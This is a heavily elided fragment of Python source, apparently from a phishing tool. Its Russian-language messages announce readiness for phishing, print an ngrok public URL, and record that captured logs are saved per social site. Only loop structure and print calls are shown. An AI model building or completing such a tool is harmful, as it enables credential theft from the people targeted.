    ...
    while True:
        ...
        if len(lines) != 0:
            ...
            try:
                ...
                print(red(' [!] Извините, отправитель отказался :('))
                pass
    ...
    while True:
        try:
            ...
            if ngrok_url.status_code == 200:
                ...
                print(green(' [~] Готов к фишингу'))
                print(lightgreen(' [*] URL-адрес Ngrok: %s' % public_url))
                print(green(' [~] Ваши журналы хранятся в: Logs/{}').format(_social + strftime('-%y%m%d.txt')))
                print(yellow(' [^] Для выхода нажмите Ctrl + C или VolDown + C (android).'))
                yield public_url
                break
